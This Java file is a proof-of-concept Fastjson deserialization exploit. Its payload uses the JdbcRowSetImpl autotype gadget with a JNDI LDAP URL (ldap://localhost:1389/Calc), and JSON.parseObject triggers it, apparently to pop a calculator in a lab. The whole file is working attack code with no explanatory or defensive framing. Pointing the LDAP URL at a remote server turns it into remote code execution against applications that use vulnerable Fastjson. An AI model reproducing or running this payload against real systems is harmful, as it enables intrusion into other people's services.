import com.alibaba.fastjson.JSON;

public class JdbcRowSetImplLdapExp {
    public static void main(String[] args) {
        String payload = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"ldap://localhost:1389/Calc\", \"autoCommit\":true}";
        JSON.parseObject(payload);
    }
}
